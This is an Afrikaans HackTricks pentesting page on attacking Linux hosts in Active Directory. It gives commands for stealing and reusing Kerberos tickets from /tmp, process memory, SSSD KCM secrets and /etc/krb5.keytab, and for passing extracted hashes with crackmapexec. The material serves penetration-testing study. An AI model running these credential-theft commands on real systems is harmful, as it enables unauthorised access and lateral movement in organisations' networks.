# Linux Aktiewe Gids

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

'n Linux-rekenaar kan ook binne 'n Aktiewe Gids-omgewing teenwoordig wees.

'n Linux-rekenaar in 'n AD kan **verskillende CCACHE-kaartjies binne lêers stoor. Hierdie kaartjies kan gebruik en misbruik word soos enige ander kerberos-kaartjie**. Om hierdie kaartjies te lees, moet jy die eienaar van die kaartjie of **root** binne die rekenaar wees.

## Enumerasie

### AD enumerasie vanaf Linux

As jy toegang het tot 'n AD in Linux (of bash in Windows), kan jy [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) probeer om die AD te enumereer.

Jy kan ook die volgende bladsy raadpleeg om **ander maniere om AD vanaf Linux te enumereer** te leer:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA is 'n oopbron **alternatief** vir Microsoft Windows **Aktiewe Gids**, hoofsaaklik vir **Unix**-omgewings. Dit kombineer 'n volledige **LDAP-gids** met 'n MIT **Kerberos** Sleutelverspreidingsentrum vir bestuur soortgelyk aan Aktiewe Gids. Deur gebruik te maak van die Dogtag **Sertifikaatstelsel** vir CA & RA sertifikaatbestuur, ondersteun dit **multi-faktor**-verifikasie, insluitend slimkaarte. SSSD is geïntegreer vir Unix-verifikasieprosesse. Lees meer daaroor in:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Speel met kaartjies

### Pass The Ticket

Op hierdie bladsy sal jy verskillende plekke vind waar jy **kerberos-kaartjies binne 'n Linux-gashouer kan vind**, op die volgende bladsy kan jy leer hoe om hierdie CCache-kaartjie-formate na Kirbi te omskep (die formaat wat jy in Windows moet gebruik) en ook hoe om 'n PTT-aanval uit te voer:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### CCACHE-kaartjie-hergebruik vanaf /tmp

CCACHE-lêers is binêre formate vir **stoor van Kerberos-legitimasie** word tipies gestoor met 600-permissies in `/tmp`. Hierdie lêers kan geïdentifiseer word deur hul **naamformaat, `krb5cc_%{uid}`,** wat ooreenstem met die gebruiker se UID. Vir verifikasie van die legitieme kaartjie moet die **omgewingsveranderlike `KRB5CCNAME`** ingestel word op die pad van die gewenste kaartjielêer, sodat dit hergebruik kan word.

Lys die huidige kaartjie wat vir legitimasie gebruik word met `env | grep KRB5CCNAME`. Die formaat is draagbaar en die kaartjie kan **hergebruik word deur die omgewingsveranderlike** in te stel met `export KRB5CCNAME=/tmp/ticket.ccache`. Die naamformaat van die Kerberos-kaartjie is `krb5cc_%{uid}` waar uid die gebruiker se UID is.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE-kaartjies hergebruik van sleutelring

**Kerberos-kaartjies wat in die geheue van 'n proses gestoor word, kan onttrek word**, veral wanneer die ptrace-beskerming van die masjien gedeaktiveer is (`/proc/sys/kernel/yama/ptrace_scope`). 'n Nuttige instrument vir hierdie doel is beskikbaar by [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), wat die onttrekking fasiliteer deur in sessies in te spuit en kaartjies na `/tmp` te dump.

Om hierdie instrument te konfigureer en te gebruik, word die volgende stappe gevolg:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Hierdie prosedure sal probeer om in verskeie sessies in te spuit, sukses aandui deur geëkstraeerde kaartjies in `/tmp` te stoor met 'n naamkonvensie van `__krb_UID.ccache`.


### CCACHE-kaartjiehergebruik vanaf SSSD KCM

SSSD onderhou 'n kopie van die databasis by die pad `/var/lib/sss/secrets/secrets.ldb`. Die ooreenstemmende sleutel word gestoor as 'n verborge lêer by die pad `/var/lib/sss/secrets/.secrets.mkey`. Standaard is die sleutel slegs leesbaar as jy **root**-regte het.

Deur \*\*`SSSDKCMExtractor` \*\* aan te roep met die --database en --key parameters, sal die databasis geanaliseer word en die geheime **ontsleutel**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Die **kerberos-blob van die geloofsbewaarplek kan omskep word in 'n bruikbare Kerberos CCache-lêer** wat aan Mimikatz/Rubeus oorgedra kan word.

### Hergebruik van CCACHE-kaartjie vanaf sleuteltabel
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Haal rekeninge uit /etc/krb5.keytab

Diensrekening sleutels, noodsaaklik vir dienste wat met root-voorregte werk, word veilig gestoor in **`/etc/krb5.keytab`** lêers. Hierdie sleutels, soortgelyk aan wagwoorde vir dienste, vereis streng vertroulikheid.

Om die inhoud van die keytab-lêer te ondersoek, kan **`klist`** gebruik word. Die instrument is ontwerp om sleutelbesonderhede te vertoon, insluitend die **NT Hash** vir gebruikersverifikasie, veral wanneer die sleutel tipe as 23 geïdentifiseer word.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Vir Linux-gebruikers bied **`KeyTabExtract`** funksionaliteit om die RC4 HMAC-hash uit te trek, wat gebruik kan word vir hergebruik van NTLM-hash.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Op macOS dien **`bifrost`** as 'n instrument vir die analise van keytab-lêers.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Deur gebruik te maak van die onttrekte rekening- en hasinligting, kan verbinding met bedieners tot stand gebring word deur middel van gereedskap soos **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Verwysings
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
